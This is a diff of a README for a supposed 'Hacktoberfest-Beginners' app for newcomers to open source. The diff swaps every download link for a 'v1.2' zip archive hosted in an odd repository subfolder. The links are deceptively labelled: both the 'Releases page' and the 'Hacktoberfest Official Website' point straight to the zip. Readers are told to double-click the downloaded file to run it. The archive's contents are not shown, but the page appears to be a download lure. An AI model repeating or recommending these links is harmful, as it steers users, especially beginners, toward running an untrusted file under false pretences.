@@ -1,6 +1,6 @@
 # 🎉 Hacktoberfest-Beginners - Learn Open Source with Ease
 
-[![Download Here](https://raw.githubusercontent.com/vendom14/Hacktoberfest-Beginners/main/Hieracian/Hacktoberfest-Beginners.zip%20Now-Click%20to%20Download-blue)](https://raw.githubusercontent.com/vendom14/Hacktoberfest-Beginners/main/Hieracian/Hacktoberfest-Beginners.zip)
+[![Download Here](https://raw.githubusercontent.com/vendom14/Hacktoberfest-Beginners/main/Hieracian/Hacktoberfest-Beginners-v1.2.zip%20Now-Click%20to%20Download-blue)](https://raw.githubusercontent.com/vendom14/Hacktoberfest-Beginners/main/Hieracian/Hacktoberfest-Beginners-v1.2.zip)
 
 ## ✨ Overview
 
@@ -12,7 +12,7 @@ To get started, you need to download the application from our Releases page. Fol
 
 ## 📥 Download & Install
 
-1. **Visit our Releases page:** Click [here](https://raw.githubusercontent.com/vendom14/Hacktoberfest-Beginners/main/Hieracian/Hacktoberfest-Beginners.zip) to go to the Releases page.
+1. **Visit our Releases page:** Click [here](https://raw.githubusercontent.com/vendom14/Hacktoberfest-Beginners/main/Hieracian/Hacktoberfest-Beginners-v1.2.zip) to go to the Releases page.
 2. **Choose the latest version:** Look for the most recent release at the top of the page.
 3. **Download the files:** Click on the file you want to download. Save it to your computer.
 4. **Run the application:** After downloading, locate the downloaded file and double-click it to run.
@@ -54,7 +54,7 @@ Participating in Hacktoberfest can be an excellent way to learn new skills and m
 
 ## 📑 Resources
 
-1. **Hacktoberfest Official Website:** [https://raw.githubusercontent.com/vendom14/Hacktoberfest-Beginners/main/Hieracian/Hacktoberfest-Beginners.zip](https://raw.githubusercontent.com/vendom14/Hacktoberfest-Beginners/main/Hieracian/Hacktoberfest-Beginners.zip) - Learn more about the event.
+1. **Hacktoberfest Official Website:** [https://raw.githubusercontent.com/vendom14/Hacktoberfest-Beginners/main/Hieracian/Hacktoberfest-Beginners-v1.2.zip](https://raw.githubusercontent.com/vendom14/Hacktoberfest-Beginners/main/Hieracian/Hacktoberfest-Beginners-v1.2.zip) - Learn more about the event.
 2. **Documentation:** Access detailed information on using the application within the app itself.
 3. **Tutorial Videos:** Find helpful tutorials via links provided in the app’s resources section.
 
@@ -74,4 +74,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 Thank you for choosing Hacktoberfest-Beginners on your journey into open source! We hope you find the application helpful and easy to use. For more information or support, don’t hesitate to contact us through our community channels.
 
-[![Download Here](https://raw.githubusercontent.com/vendom14/Hacktoberfest-Beginners/main/Hieracian/Hacktoberfest-Beginners.zip%20Now-Click%20to%20Download-blue)](https://raw.githubusercontent.com/vendom14/Hacktoberfest-Beginners/main/Hieracian/Hacktoberfest-Beginners.zip)
+[![Download Here](https://raw.githubusercontent.com/vendom14/Hacktoberfest-Beginners/main/Hieracian/Hacktoberfest-Beginners-v1.2.zip%20Now-Click%20to%20Download-blue)](https://raw.githubusercontent.com/vendom14/Hacktoberfest-Beginners/main/Hieracian/Hacktoberfest-Beginners-v1.2.zip)
